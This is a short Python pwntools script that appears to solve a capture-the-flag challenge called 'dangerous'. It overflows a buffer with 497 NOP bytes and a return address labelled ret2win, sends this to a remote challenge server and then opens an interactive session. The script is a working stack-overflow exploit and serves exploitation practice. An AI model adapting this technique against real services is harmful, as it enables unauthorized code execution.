#!/usr/bin/env python2
from pwn import *
context(arch='amd64', os='linux')

def pwn():

    e = ELF("./dangerous")
    ret2winaddr = p64(0x040130e)

    info("%#x target", ret2winaddr)
    #io = process('./dangerous')

    io = remote('jh2i.com', 50011)

    print(io.recvuntil("What's your name?"))

    ''' Create buffer '''
    buf = "\x90" * 497

    io.sendline(buf + ret2winaddr + "\n")
    io.interactive()

if __name__ == '__main__':
    pwn()
